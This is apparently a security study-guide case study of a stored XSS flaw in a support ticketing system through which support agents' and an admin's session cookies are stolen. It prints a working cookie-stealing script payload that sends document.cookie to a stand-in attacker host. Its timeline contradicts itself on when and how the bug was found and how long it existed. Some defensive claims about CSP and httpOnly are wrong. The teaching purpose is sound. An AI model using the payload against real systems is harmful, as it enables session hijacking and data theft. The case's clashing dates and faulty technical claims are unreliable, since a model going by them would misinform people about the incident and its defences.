---
title: "Case: The Ticket System Stored XSS — Support Agents Compromised via Malicious Tickets"
description: "A stored XSS vulnerability in an internal ticketing system at a SaaS company allows attackers to steal session cookies from support agents and administrator accounts. The bug was in production for 8 months before discovery."
draft: false
date: 2026-03-21
tags:
  - domain/2
  - type/case
---

## The Scenario

CloudSupport Technologies operates a SaaS ticketing platform used by 12,000+ organizations to manage customer support interactions. The platform handles approximately 4 million support tickets monthly. The company employs 340 staff members, including 87 support agents who review, respond to, and resolve customer issues through the internal ticketing system. In March 2026, during a routine security assessment, a penetration tester discovered a [[stored-persistent-xss|stored XSS (cross-site scripting) vulnerability]] in the ticket description field that had existed for 8 months undetected.

The vulnerability was textbook: when a ticket was created with JavaScript code in the description field, that code was stored in the database without sanitization or validation. When support agents (or any user with ticket access) viewed the ticket, the JavaScript executed automatically in their browser with the same privileges as the logged-in user. This is fundamentally different from [[reflected-xss|reflected XSS]] (where the payload is in the URL and only affects one person clicking a malicious link) or [[dom-based-xss|DOM-based XSS]] (where client-side JavaScript processes untrusted data). Stored XSS is persistent and affects everyone who views the compromised content.

On January 14, 2026, an attacker created a ticket in the CloudSupport system with the subject "Billing inquiry - Account 5847" and this payload in the ticket description field:

```javascript
<script>
fetch('http://attacker-server.com/steal-cookie?cookie=' + document.cookie)
</script>
```

The ticket was assigned to the support queue. When support agents viewed the ticket to investigate the customer's billing issue, the JavaScript payload executed automatically in their browser context. The `fetch()` API sent the agent's session cookie to the attacker's server. The attacker recorded each agent's cookie: a unique token that authenticated them to the CloudSupport system and granted access to customer data, internal tools, and support agent administration panels.

Over the course of 8 months (January through August 2026), the attacker collected approximately 47 distinct support agent session cookies through multiple variations of this payload. More critically, on February 3, the attacker created another malicious ticket that was viewed by Maria Rodriguez, the Senior Support Manager with administrator privileges. Maria's session cookie—which granted full access to the admin panel, including the ability to create accounts, reset passwords, modify customer data, and access audit logs—was stolen and used by the attacker.

With Maria's stolen administrator session cookie, the attacker logged into the CloudSupport admin panel at 11:17 PM UTC on February 4, 2026. Over the next 47 hours (spanning a weekend when fewer staff were monitoring systems), the attacker:

- Created a new hidden admin account (username: `maint_user`, password: auto-generated) with full administrative privileges.
- Accessed the customer data export function and downloaded customer information for 1,247 support customers, including names, email addresses, company information, and support history.
- Modified customer account settings on 23 accounts to disable 2FA and reset their API keys (likely to enable future backdoor access or credential stuffing attacks).
- Deleted audit logs covering the 47-hour intrusion window to cover their tracks.
- Created a scheduled task to re-add the hidden admin account if it was discovered and deleted, providing persistence.

The breach was discovered accidentally on August 17, 2026, when a security researcher at a customer organization submitted a test ticket containing `<img src=x onerror="alert('XSS')">` as a proof-of-concept security test (to verify that the vendor's systems were vulnerable). When a support agent viewed the ticket, a browser alert box popped up—an obvious sign of XSS. The agent, startled by the browser alert, reported it to CloudSupport's IT department. IT escalated to the security team, who immediately recognized the pattern: this was [[stored-persistent-xss|stored XSS]], and it was still active after 8 months.

The security team's investigation revealed:

- The vulnerability existed in the original codebase from the system's launch in 2016.
- Ticket descriptions were stored in the database without any HTML/JavaScript escaping or sanitization.
- When tickets were displayed, the description was rendered as raw HTML without encoding special characters (< > & quotes).
- There was no [[content-security-policy|Content Security Policy (CSP)]] headers that could have restricted what the JavaScript could do.
- The application did not use `httpOnly` cookies, which would have prevented the `document.cookie` API from accessing session tokens.
- There was no [[web-application-firewall]] deployed in front of the application to detect and block obvious XSS payloads like `<script>` tags.

By August 18, 2026, at 8:00 AM, CloudSupport had discovered the full extent of the compromise: 47 agents' session cookies stolen, 1 administrator account fully compromised, 1,247 customers' data exfiltrated, persistent backdoor accounts created, and audit logs tampered with. The company had no way to determine if any customer data had been sold to criminals, used for follow-on attacks (phishing, credential stuffing), or was currently being exploited.

## What Went Right

- **Penetration test or external security research discovered the vulnerability**: Rather than an attacker discovering the XSS first (as happened in reality), if the security team had discovered it earlier through regular pen testing, they could have fixed it before the 8-month exposure window. The irony is that the researcher's XSS test payload was what forced discovery.

- **Post-breach incident response was comprehensive**: Once discovered, CloudSupport immediately: (1) disabled all active session tokens, forcing all users to re-authenticate, (2) deleted the hidden admin account and removed the persistence mechanism, (3) implemented output encoding to escape all ticket description content, (4) deployed a WAF in front of the application to block XSS patterns, and (5) deployed CSP headers to restrict what injected scripts could do.

- **All affected customers were notified**: The company conducted forensic analysis to determine which customers' data was accessed and notified them within 48 hours. They offered 2 years of free credit monitoring and 1 year of complimentary support.

## What Could Go Wrong

- **No input validation on ticket description**: The application accepted any string in the description field—including `<script>`, `<img>`, event handlers—without validation. Whitelist-based input validation that rejects or encodes dangerous patterns would have blocked the XSS payload immediately.

- **No output encoding when displaying ticket content**: Ticket descriptions were displayed as raw HTML. The application should have used HTML entity encoding (converting `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, etc.), which would have rendered the `<script>` tag as text instead of executing it.

- **No [[content-security-policy|Content Security Policy (CSP)]] headers**: CSP can restrict what injected scripts can do (e.g., disable `fetch()` API calls, restrict script sources to trusted origins). A policy like `script-src 'self'` would have prevented the attacker's `fetch()` call from sending data to external servers.

- **Session cookies were accessible via JavaScript**: The application stored session tokens in regular (non-`httpOnly`) cookies, which means JavaScript (`document.cookie`) could access them. Using `httpOnly` cookies (inaccessible to JavaScript) and the `Secure` flag (only sent over HTTPS) would have prevented the cookie theft entirely.

- **No [[web-application-firewall]]**: A WAF in front of the application could have detected and blocked obvious [[stored-persistent-xss|stored XSS]] patterns (`<script>`, `<iframe>`, event handlers like `onerror`, etc.) before they reached the application.

- **8-month detection gap**: The vulnerability existed for 8 months before discovery. Regular security assessments, code reviews, or automated scanning tools (SAST—Static Application Security Testing) would have detected the vulnerability much earlier.

## Key Takeaways

- **[[stored-persistent-xss|Stored XSS]] is more dangerous than reflected XSS**: Stored XSS affects every user who views the compromised content, making it a persistent, long-lived vulnerability. Reflected XSS typically requires social engineering (victims clicking a malicious link).

- **[[input-validation]] must reject or encode dangerous characters**: Never trust user input. Whitelist acceptable patterns (e.g., "ticket description must contain only alphanumeric characters, spaces, and punctuation"). Reject or encode anything else.

- **[[output-encoding|Output encoding]] is mandatory, even if input validation exists**: Assume input validation can fail. When displaying user-controlled data, always encode special characters (HTML entity encoding, JavaScript string escaping, URL encoding depending on context).

- **[[content-security-policy|Content Security Policy (CSP)]] restricts what injected scripts can do**: Even if an XSS payload is injected, CSP can prevent it from exfiltrating data via `fetch()`, from making AJAX requests, or from injecting new scripts. CSP is a defense-in-depth layer.

- **`httpOnly` and `Secure` flags on session cookies prevent token theft**: JavaScript cannot access `httpOnly` cookies, and `Secure` flag ensures cookies are only sent over HTTPS. This prevents [[dom-based-xss|DOM-based XSS]] and [[man-in-the-middle]] attacks from stealing session tokens.

- **[[web-application-firewall|WAF]] provides pattern-based detection**: While WAF is not a silver bullet (sophisticated XSS payloads can bypass WAF detection), a WAF can catch obvious patterns and reduce attack volume.

## Related Cases

- **[[case-application-attacks]]** — [[xss-and-csrf|XSS and CSRF]], [[broken-authentication]], and other application vulnerabilities; understanding the OWASP Top 10.

- **[[case-injection-attacks]]** — XSS is a special case of injection attacks; other injection variants ([[sql-injection-sqli]], [[ldap-injection]], [[xml-injection-xxe]]) require similar defenses (input validation, output encoding, parameterized queries).

- **[[case-penetration-testing]]** — How to systematically discover XSS vulnerabilities through both automated scanning and manual testing; understanding attack methodologies.

- **[[case-hardening]]** — Secure coding practices for web applications including [[input-validation]], [[output-encoding]], [[content-security-policy]], and secure session management.
